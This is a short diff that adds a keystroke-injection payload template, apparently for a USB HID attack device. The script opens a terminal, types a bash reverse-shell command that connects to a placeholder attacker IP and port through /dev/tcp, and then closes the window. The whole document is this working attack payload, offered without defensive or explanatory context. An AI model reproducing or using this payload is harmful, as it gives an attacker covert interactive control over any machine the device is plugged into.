@@ -1,0 +1,7 @@
+DELAY 600
+CTRL-ALT t
+DELAY 400
+STRING sh -i >& /dev/tcp/{ip}/{port} 0>&1{run_background}
+ENTER
+STRING exit
+ENTER
